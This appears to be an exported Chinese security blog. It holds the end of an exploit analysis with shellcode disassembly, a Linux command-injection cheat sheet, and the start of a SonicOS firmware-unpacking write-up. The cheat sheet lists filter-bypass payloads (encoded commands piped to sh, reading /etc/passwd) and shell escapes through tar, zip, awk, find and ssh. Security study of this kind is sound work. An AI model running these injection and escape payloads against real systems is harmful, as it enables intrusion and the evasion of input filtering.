class="line">0x7ffcc7d7c0b7    syscall  &lt;SYS_close&gt;</span><br><span class="line">       fd: 0xd</span><br><span class="line">0x7ffcc7d7c0b9    mov    eax, 0x3b</span><br><span class="line">0x7ffcc7d7c0be    lea    rdi, [rip + 0x3f]</span><br><span class="line">0x7ffcc7d7c0c5    mov    qword ptr [rip + 0x20], rdi</span><br><span class="line">0x7ffcc7d7c0cc    lea    rsi, [rip + 0x41]</span><br><span class="line">0x7ffcc7d7c0d3    mov    qword ptr [rip + 0x1a], rsi</span><br><span class="line">0x7ffcc7d7c0da    lea    rsi, [rip + 0xb]</span><br><span class="line">0x7ffcc7d7c0e1    xor    edx, edx</span><br><span class="line">0x7ffcc7d7c0e3    syscall  &lt;SYS_execve&gt;</span><br><span class="line">        path: 0x7ffcc7d7c104 ◂— &#x27;/usr/bin/python&#x27;</span><br><span class="line">        argv: 0x7ffcc7d7c0ec —▸ 0x7ffcc7d7c104 ◂— &#x27;/usr/bin/python&#x27;</span><br><span class="line">        envp: 0x0</span><br><span class="line">0x7ffcc7d7c0e5    mov    eax, 0x3c</span><br><span class="line">0x7ffcc7d7c0ea    syscall &lt;SYS_exit&gt;</span><br></pre></td></tr></table></figure></div>

<p>对 ROP 分析请看代码中的注释，简单来说，此程序的 stack 区域默认具有可执行权限，作者用一种比较巧妙的方法将栈的地址加载到寄存器 rax 中，然后跳转到 rax 执行 shellcode，shellcode 部分利用 syscall 实现了将 python code 写入 &#x2F;tmp&#x2F;test.py，然后执行 &#x2F;usr&#x2F;bin&#x2F;python &#x2F;tmp&#x2F;test.py 的操作，最终实现任意代码执行。</p>
<h2 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h2><p>该漏洞成因是使用 libxml2 SAX 解析 xml 时，startElementNs handler 的编码有问题，代码中没有检查 tag_name 长度就直接将其拼接到全局变量中，导致全局变量溢出。</p>
<p>程序内存布局比较特殊，bss 区域后面紧跟着 heap 区域，所以可以将全局变量的溢出转变为堆溢出，另外堆中又保存了 xmlSAXHandler 结构，可以将其中的 handler 指针覆盖，从而劫持控制流。</p>
<p>exp 作者通过巧妙的构造，将控制流首先劫持到 ret 0x90c6，由于传入的 POST 数据也会位于栈上，通过精心控制偏移，可以将程序劫持到 ROP 链上，从而将指针覆盖转换为栈溢出利用手法。</p>
<p>ROP 链中又构造出能够直接将控制流转移到栈上的 gadget，避免了需要爆破地址的问题。由于栈具有可执行权限，通过控制偏移即可跳转到 shellcode 上执行。</p>
<p>shellcode 中构造 syscall 将 python 代码写入本地文件并执行，解决了 &#x2F;tmp mount 为 noexec 的问题。</p>
<p>很多完美的内存布局降低了开发利用代码的难度，加上作者巧妙的利用手段，使得此 exp 稳定性较高，危害较大。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>Linux 命令注入备忘录</title>
    <url>/2022/03/21/command-inject/</url>
    <content><![CDATA[<p>Linux 下命令注入方式总结和常见过滤绕过备忘录</p>
<span id="more"></span>

<h2 id="SHELL-常用字符"><a href="#SHELL-常用字符" class="headerlink" title="SHELL 常用字符"></a>SHELL 常用字符</h2><h3 id=""><a href="#" class="headerlink" title="|"></a>|</h3><p>管道符号，将上一条指令的标准输出作为下一条指令的标准输入</p>
<p>正则表达式中表示 “或者”</p>
<h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><p>将一条命令放在后台执行，或表示标准输出和标准错误输出</p>
<h3 id="-1"><a href="#-1" class="headerlink" title="||"></a>||</h3><p>表示 “或者”，连接两条命令，当前一条命令执行失败后面的命令才会执行</p>
<h3 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h3><p>表示 “和”，当前一条命令执行成功后面的命令才会执行</p>
<h3 id="-2"><a href="#-2" class="headerlink" title=";"></a>;</h3><p>分号拼接连续几条命令，就算前面的命令执行失败后面也会执行</p>
<h3 id="-3"><a href="#-3" class="headerlink" title="$"></a>$</h3><p>美元符号用来获取变量的值</p>
<h3 id="-4"><a href="#-4" class="headerlink" title="()"></a>()</h3><p>组合命令执行，称为指令群组，可以结合分号执行多条命令</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">ls</span> -la ; ifconfig)</span><br></pre></td></tr></table></figure></div>

<p>shell 中针对指令群组会产生 subshell 执行</p>
<h3 id="96"><a href="#96" class="headerlink" title="&#96;"></a>&#96;</h3><p>反引号表示 “指令替代”，将反引号包裹的命令输出结果作为另一个指令的输入</p>
<h3 id="-5"><a href="#-5" class="headerlink" title="$()"></a>$()</h3><p>也表示指令替代</p>
<h3 id="‘"><a href="#‘" class="headerlink" title="‘"></a>‘</h3><p>单引号将包裹住的内容视为字符串，其中 $ 等符号不会被进一步处理</p>
<h3 id="“"><a href="#“" class="headerlink" title="“"></a>“</h3><p>双引号和单引号功能相同，但是双引号包裹的字符串中 $ 等符号会被拓展为变量</p>
<h3 id="-6"><a href="#-6" class="headerlink" title="(())"></a>(())</h3><p>连续两个小括号可以用来进行算数运算，类似 let 指令</p>
<h3 id="-7"><a href="#-7" class="headerlink" title="{}"></a>{}</h3><p>大括号可用于字符组合</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &#123;./te,st&#125;&#123;st,st&#125;</span><br></pre></td></tr></table></figure></div>
<p>最终会生成</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ./test</span><br><span class="line"><span class="built_in">cat</span> ./test</span><br><span class="line"><span class="built_in">cat</span> ./stst</span><br><span class="line"><span class="built_in">cat</span> ./stst</span><br></pre></td></tr></table></figure></div>

<p>另用于实现匿名函数</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">&#123; cmd1; cmd2; cmd3;&#125;</span><br></pre></td></tr></table></figure></div>
<p>第一条命令和大括号之间要有空格，每条命令后要有分号</p>
<p>正则表达式中表示范围</p>
<h3 id="-8"><a href="#-8" class="headerlink" title="[]"></a>[]</h3><p>中括号常用于流程控制，起判断作用，在正则表达式中表示范围或者集合</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ./te[0-z]t</span><br></pre></td></tr></table></figure></div>

<p>但中括号中不能使用 &amp;&amp; 等逻辑字符</p>
<h3 id="-9"><a href="#-9" class="headerlink" title="[[]]"></a>[[]]</h3><p>双中括号用于字符串比较测试，允许在其中使用 || &amp;&amp; 等逻辑符号</p>
<h3 id="gt"><a href="#gt" class="headerlink" title="&gt;"></a>&gt;</h3><p>大于号表示输出重定向，如果目标文件已经存在则覆盖其中的内容</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;test&quot;</span> &gt; <span class="built_in">test</span></span><br></pre></td></tr></table></figure></div>

<p>shell 中提供了叫做 noclobber 的特性，它可以防止重定向不经意间修改了目标文件，打开此特性后如果进行重定向覆盖文件，shell 会报告错误而不覆盖目标文件。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">iot@ubuntu:~/Desktop$ set -o noclobber</span><br><span class="line">iot@ubuntu:~/Desktop$ echo &quot;overwrite&quot; &gt; test</span><br><span class="line">bash: test：无法覆盖已存在的文件</span><br><span class="line">iot@ubuntu:~/Desktop$ set +o noclobber</span><br><span class="line">iot@ubuntu:~/Desktop$ echo &quot;overwrite&quot; &gt; test</span><br><span class="line">iot@ubuntu:~/Desktop$</span><br></pre></td></tr></table></figure></div>



<h3 id="lt"><a href="#lt" class="headerlink" title="&lt;"></a>&lt;</h3><p>小于号表示输入重定向</p>
<h3 id="gt-gt"><a href="#gt-gt" class="headerlink" title="&gt;&gt;"></a>&gt;&gt;</h3><p>双大于号表示输出重定向追加</p>
<h3 id="lt-lt"><a href="#lt-lt" class="headerlink" title="&lt;&lt;"></a>&lt;&lt;</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd &lt;&lt; end</span><br></pre></td></tr></table></figure></div>



<p>双小于号从标准输入中读取输入，直到遇到指定的字符串(end)结束</p>
<p>如果输入不使用引号包裹，则命令会执行变量替换，如果使用 <strong>&lt;&lt;-</strong> ，则读取的时候会忽略每行输入前面的 tab</p>
<h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">*</td>
<td align="left">匹配任意长度任意字符</td>
</tr>
<tr>
<td align="left">?</td>
<td align="left">匹配任意单个字符</td>
</tr>
<tr>
<td align="left">[list]</td>
<td align="left">匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合</td>
</tr>
<tr>
<td align="left">[^list]</td>
<td align="left">匹配指定范围外的任意单个字符或字符集合</td>
</tr>
<tr>
<td align="left">[!list]</td>
<td align="left">同<code>[^list]</code></td>
</tr>
<tr>
<td align="left">{str1,str2,…}</td>
<td align="left">匹配 srt1 或者 srt2 或者更多字符串，也可以是集合</td>
</tr>
<tr>
<td align="left">IFS</td>
<td align="left">由 &lt; space &gt; 或 &lt; tab &gt; 或 &lt; enter &gt; 三者之一组成</td>
</tr>
<tr>
<td align="left">CR</td>
<td align="left">由 &lt; enter &gt; 产生</td>
</tr>
<tr>
<td align="left">!</td>
<td align="left">执行 history 中的命令</td>
</tr>
</tbody></table>
<p>专用字符集</p>
<table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">意义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">[:alnum:]</td>
<td align="left">任意数字或者字母</td>
</tr>
<tr>
<td align="left">[:alpha:]</td>
<td align="left">任意字母</td>
</tr>
<tr>
<td align="left">[:space:]</td>
<td align="left">空格</td>
</tr>
<tr>
<td align="left">[:lower:]</td>
<td align="left">小写字母</td>
</tr>
<tr>
<td align="left">[:digit:]</td>
<td align="left">任意数字</td>
</tr>
<tr>
<td align="left">[:upper:]</td>
<td align="left">任意大写字母</td>
</tr>
<tr>
<td align="left">[:cntrl:]</td>
<td align="left">控制符</td>
</tr>
<tr>
<td align="left">[:graph:]</td>
<td align="left">图形</td>
</tr>
<tr>
<td align="left">[:print:]</td>
<td align="left">可打印字符</td>
</tr>
<tr>
<td align="left">[:punct:]</td>
<td align="left">标点符号</td>
</tr>
<tr>
<td align="left">[:xdigit:]</td>
<td align="left">十六进制数</td>
</tr>
<tr>
<td align="left">[:blank:]</td>
<td align="left">空白字符</td>
</tr>
</tbody></table>
<p>使用专用字符集例子，注意要用双中括号</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ./te[[:alpha:]]t</span><br></pre></td></tr></table></figure></div>



<h3 id="重定向组合应用"><a href="#重定向组合应用" class="headerlink" title="重定向组合应用"></a>重定向组合应用</h3><ul>
<li>cmd &gt;| file  和单个大于号功能相同，但它可以忽略 noclobber 的限制</li>
<li>:&gt; file  将文件截断为 0 长度，文件不存在则创建</li>
<li>cmd &gt;&amp;n 将命令输出到文件描述符 n</li>
<li>cmd m&gt;&amp;n 把输出到文件描述符 m 的信息重定向到 n</li>
</ul>
<h2 id="字符过滤绕过"><a href="#字符过滤绕过" class="headerlink" title="字符过滤绕过"></a>字符过滤绕过</h2><h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><ul>
<li>用 $IFS 绕过</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span><span class="variable">$IFStest</span></span><br><span class="line"><span class="built_in">cat</span><span class="variable">$&#123;IFS&#125;</span><span class="built_in">test</span></span><br><span class="line"><span class="built_in">cat</span>$IFS<span class="variable">$9test</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>用重定向符号绕过</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span>&lt;<span class="built_in">test</span></span><br><span class="line"><span class="built_in">cat</span>&lt;&gt;<span class="built_in">test</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>bash 中使用大括号绕过</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">&#123;<span class="built_in">cat</span>,./test&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>环境变量绕过</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">iot@ubuntu:~/Desktop/test$ x=$<span class="string">&#x27;cat\x20test&#x27;</span>&amp;&amp;<span class="variable">$x</span></span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">iot@ubuntu:~/Desktop/test$ x=$<span class="string">&#x27;cat\x09test&#x27;</span>&amp;&amp;<span class="variable">$x</span></span><br><span class="line"><span class="built_in">test</span></span><br></pre></td></tr></table></figure></div>



<h3 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h3><ul>
<li>用 $@</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">c<span class="variable">$@at</span> ./test</span><br></pre></td></tr></table></figure></div>

<ul>
<li>用环境变量绕过</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">x=c;y=a;z=t;$x$y<span class="variable">$z</span> <span class="built_in">test</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>用编码绕过</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. base64</span></span><br><span class="line">iot@ubuntu:~/Desktop/test$ <span class="built_in">echo</span> <span class="string">&quot;cat test&quot;</span> | <span class="built_in">base64</span></span><br><span class="line">Y2F0IHRlc3QK</span><br><span class="line">iot@ubuntu:~/Desktop/test$ <span class="built_in">echo</span> <span class="string">&quot;Y2F0IHRlc3QK&quot;</span> | <span class="built_in">base64</span> -d | sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. hex</span></span><br><span class="line">iot@ubuntu:~/Desktop/test$ <span class="built_in">echo</span> <span class="string">&quot;cat test&quot;</span> | xxd -ps</span><br><span class="line">63617420746573740a</span><br><span class="line">iot@ubuntu:~/Desktop/test$ <span class="built_in">echo</span> <span class="string">&quot;63617420746573740a&quot;</span> | xxd -r -p | sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. printf</span></span><br><span class="line"><span class="comment"># printf 支持多种编码输出</span></span><br><span class="line">iot@ubuntu:~/Desktop/test$ $(<span class="built_in">printf</span> <span class="string">&#x27;\154\163&#x27;</span>)</span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">iot@ubuntu:~/Desktop/test$ $(<span class="built_in">printf</span> <span class="string">&#x27;\x6c\x73&#x27;</span>)</span><br><span class="line"><span class="built_in">test</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>单引号和双引号</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">iot@ubuntu:~/Desktop/test$ c<span class="string">&quot;a&quot;</span>t ./test</span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">iot@ubuntu:~/Desktop/test$ <span class="built_in">cat</span> ./t<span class="string">&#x27;e&#x27;</span>st</span><br><span class="line"><span class="built_in">test</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>反斜线</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">iot@ubuntu:~/Desktop/test$ c\at ./t\e\st</span><br><span class="line"><span class="built_in">test</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>用环境变量绕过</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 绕过斜线</span></span><br><span class="line"><span class="built_in">cat</span> <span class="variable">$&#123;PATH:0:1&#125;</span>etc<span class="variable">$&#123;PATH:0:1&#125;</span>passwd</span><br><span class="line"><span class="comment"># 特殊变量</span></span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span>  <span class="comment"># 分隔符</span></span><br><span class="line"><span class="variable">$&#123;PS2&#125;</span>  <span class="comment"># &gt;</span></span><br><span class="line"><span class="variable">$&#123;PS4&#125;</span>  <span class="comment"># +</span></span><br><span class="line"><span class="variable">$&#123;9&#125;</span>    <span class="comment"># 空</span></span><br></pre></td></tr></table></figure></div>



<h2 id="其他特殊用法"><a href="#其他特殊用法" class="headerlink" title="其他特殊用法"></a>其他特殊用法</h2><p><strong>1. 问号</strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ./te??</span><br></pre></td></tr></table></figure></div>



<p><strong>2. []</strong></p>
<p>[…] 匹配括号中的任一个字符</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ./te[abcdsf]t</span><br></pre></td></tr></table></figure></div>



<p><strong>3. {}</strong></p>
<p>{…} 匹配大括号中所有模式</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ./te&#123;a,e,s,t,f&#125;t</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ./te&#123;a..z&#125;t</span><br></pre></td></tr></table></figure></div>



<p>[…] 和 {…} 的区别</p>
<p>[…] 当文件不存在时它会变成普通的字符串</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">iot@ubuntu:~/Desktop$ <span class="built_in">cat</span> ./te[abcdf]t</span><br><span class="line"><span class="built_in">cat</span>: <span class="string">&#x27;./te[abcdf]t&#x27;</span>: 没有那个文件或目录</span><br></pre></td></tr></table></figure></div>

<p>而 {…} 当文件不存在时依然会展开</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">iot@ubuntu:~/Desktop$ <span class="built_in">cat</span> ./te&#123;a,e,t,f&#125;t</span><br><span class="line"><span class="built_in">cat</span>: ./teat: 没有那个文件或目录</span><br><span class="line"><span class="built_in">cat</span>: ./teet: 没有那个文件或目录</span><br><span class="line"><span class="built_in">cat</span>: ./tett: 没有那个文件或目录</span><br><span class="line"><span class="built_in">cat</span>: ./teft: 没有那个文件或目录</span><br></pre></td></tr></table></figure></div>



<p><strong>4. 通配符</strong></p>
<ul>
<li><p>? * 等通配符不能匹配 &#x2F;</p>
</li>
<li><p>可以创建文件名包含通配符的文件</p>
</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">iot@ubuntu:~/Desktop$ <span class="built_in">touch</span> <span class="string">&#x27;tes*&#x27;</span></span><br><span class="line">iot@ubuntu:~/Desktop$ <span class="built_in">ls</span> tes*</span><br><span class="line"><span class="string">&#x27;tes*&#x27;</span>   <span class="built_in">test</span></span><br></pre></td></tr></table></figure></div>



<p><strong>5. 星号</strong></p>
<p>直接执行 * 相当于执行</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">dir</span> *)</span><br></pre></td></tr></table></figure></div>



<p><strong>6. alias</strong></p>
<p>alias 覆盖指令</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">iot@ubuntu:~/Desktop/test$ <span class="built_in">cat</span> <span class="built_in">test</span></span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">iot@ubuntu:~/Desktop/test$ <span class="built_in">alias</span> <span class="built_in">cat</span>=<span class="string">&quot;pwd&quot;</span></span><br><span class="line">iot@ubuntu:~/Desktop/test$ <span class="built_in">cat</span> <span class="built_in">test</span></span><br><span class="line">/home/iot/Desktop/test</span><br></pre></td></tr></table></figure></div>



<h2 id="参数注入-x2F-rbash-escape"><a href="#参数注入-x2F-rbash-escape" class="headerlink" title="参数注入&#x2F;rbash escape"></a>参数注入&#x2F;rbash escape</h2><p><strong>Github 开源项目 GTFOBins (<a class="link"   href="https://gtfobins.github.io/" >https://gtfobins.github.io/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>) 总结了大量 Linux 下可用于逃逸&#x2F;提权&#x2F;执行命令的二进制文件，Windows 环境下有 LOLBAS (<a class="link"   href="https://lolbas-project.github.io/" >https://lolbas-project.github.io/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)</strong></p>
<p>检查当前 shell</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$SHELL</span></span><br></pre></td></tr></table></figure></div>



<h3 id="vi-x2F-vim、ed、ftp、gdb、more、less、man-等文本编辑-x2F-显示工具"><a href="#vi-x2F-vim、ed、ftp、gdb、more、less、man-等文本编辑-x2F-显示工具" class="headerlink" title="vi&#x2F;vim、ed、ftp、gdb、more、less、man 等文本编辑&#x2F;显示工具"></a>vi&#x2F;vim、ed、ftp、gdb、more、less、man 等文本编辑&#x2F;显示工具</h3><p>都可以通过输入 !&#x2F;bin&#x2F;sh 获取 shell，vi&#x2F;vim 中要先输入冒号。</p>
<h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><p>tar 具有一个 checkpoint 参数，这个参数指定每写入 n 个记录之后设置一个检查点，在检查点可以执行任意操作。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">tar -cf ./exp.tar ./* --checkpoint=1 --checkpoint-action=<span class="built_in">exec</span>=<span class="string">&quot;/bin/bash&quot;</span></span><br></pre></td></tr></table></figure></div>



<h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><p>zip 有 unzip-command 参数，可以用于执行命令</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">zip ./test.zip ./test -T --unzip-command=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br></pre></td></tr></table></figure></div>



<h3 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h3><p>scp -S 参数指定一个程序用来加密链接，这里可以指定可控的脚本或程序</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">scp -S ./1.sh ./test root@x.x.x.x:/tmp</span><br></pre></td></tr></table></figure></div>



<h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure></div>



<h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p>find 的 exec 参数可以用来执行命令</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">find ./ -name <span class="built_in">test</span> -<span class="built_in">exec</span> sh \;</span><br></pre></td></tr></table></figure></div>



<h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><ol>
<li>ssh -t 参数可以指定在目标上执行的命令</li>
</ol>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">ssh iot@192.168.152.129 -t <span class="string">&quot;ls&quot;</span></span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>ProxyCommand 选项</li>
</ol>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">ssh -o ProxyCommand=<span class="string">&quot;sh -c ./1.sh&quot;</span> 127.0.0.1</span><br></pre></td></tr></table></figure></div>



<h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">help</span> status</span><br><span class="line">:/bin/sh</span><br></pre></td></tr></table></figure></div>



<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>nmap 早期版本(before May&#x2F;2009)有一个 –interactive 参数，执行后进入交互式终端，然后输入 !sh 即可获取 shell。</p>
<h3 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h3><p>tcpdump 有 -z 参数，可以执行任意程序，但是不能控制参数，tcpdump 默认提供一个参数即保存的文件名</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">➜  <span class="built_in">test</span> sudo tcpdump -n -i ens33 -G1 -w ./test -z gzip</span><br><span class="line">tcpdump: listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">gzip: ./test.gz: Permission denied</span><br><span class="line">gzip: ./test.gz: Permission denied</span><br><span class="line">gzip: ./test.gz: Permission denied</span><br></pre></td></tr></table></figure></div>



<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a class="link"   href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf" >https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.zeddyu.info/" >https://blog.zeddyu.info<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/" >https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>SonicOS 固件解密 (1)</title>
    <url>/2022/02/08/sonicwall_dec1/</url>
    <content><![CDATA[<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">本文由作者首发于安全客：https://www.anquanke.com/post/id/266078</span><br><span class="line">转载请注明出处</span><br></pre></td></tr></table></figure></div>

<span id="more"></span>

<p>最近 SonicWall 官方发布了影响 SonicOS 的数个缓冲区溢出漏洞，编号 CVE-2021-20048、CVE-2021-20046 等。在研究复现过程中发现针对此设备的解包思路比较有趣，所以在这里分享给大家。</p>
<h3 id="固件获取"><a href="#固件获取" class="headerlink" title="固件获取"></a>固件获取</h3><p>该设备固件前段时间可以从 mysonicwall 网站上获取，但目前 sonicwall 下架了 nsv200(SonicOS GEN6) 相关固件，所以这里提供旧版固件的<a class="link"   href="https://pan.baidu.com/s/1O6iyLwHUgyQKSymsaVO7Iw" >网盘链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>(提取码：1a30)，感兴趣的朋友可以自行下载。</p>
<h3 id="安装和配置"><a href="#安装和配置" class="headerlink" title="安装和配置"></a>安装和配置</h3><p>用 VMWare 打开 ova 文件，一路确定并等待开机完成。虚拟机会从 DHCP 自动获取到 IP 地址，访问可以看到登录界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-1.png"
                     
                ></p>
<p>默认用户名和密码：admin:password</p>
<h3 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h3><h4 id="启动分析"><a href="#启动分析" class="headerlink" title="启动分析"></a>启动分析</h4><p>sonicwall nsv 的默认终端是一个自定义 CLI 程序，不提供 Linux root shell，所以想要得到关键文件，必须解包固件。</p>
<p>查看虚拟机的启动过程，输出很少的信息之后就会出现 sonicwall logo</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-2.png"
                     
                ></p>
<p>厂商使用这种方式遮蔽了系统启动时输出的信息，只能直接从固件下手。</p>
<p>找到虚拟机的 vmdk 磁盘文件，使用 7-zip 打开，可以看到内部有数个分区文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-3.png"
                     
                ></p>
<p>这里也可尝试直接将磁盘挂载到已有的 Linux 虚拟机上，虚拟机设置 -&gt; 添加 -&gt; 硬盘 -&gt; SCSI -&gt; 使用现有虚拟磁盘 -&gt; 选择 sonicwall vmdk 文件 -&gt; 保持现有格式</p>
<p>挂载之后分区状态如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-4.png"
                     
                ></p>
<p>系统识别到 4 个分区，但是全部加密，猜测文件系统就位于其中一个分区内。</p>
<p>ls 查看 &#x2F;dev&#x2F; 目录下信息，发现还有 sdb1、2 等没有在文件管理器显示出来，尝试手动挂载</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mount /dev/sdb1 ./test</span><br></pre></td></tr></table></figure></div>

